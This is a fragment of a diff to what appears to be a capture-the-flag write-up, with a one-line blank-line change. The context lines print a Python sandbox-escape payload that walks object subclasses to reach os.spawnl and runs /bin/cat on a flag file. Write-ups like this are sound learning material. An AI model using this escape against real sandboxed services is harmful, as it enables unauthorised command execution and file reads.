@@ -37,6 +37,7 @@ print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[comma
 file = 'FLAG.TXT'
 print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['spawnl']('P_WAIT', "/bin/cat", "cat", file.lower()))
 ```
+
 ## Script - run_script.py
 :::spoiler
 ```python=
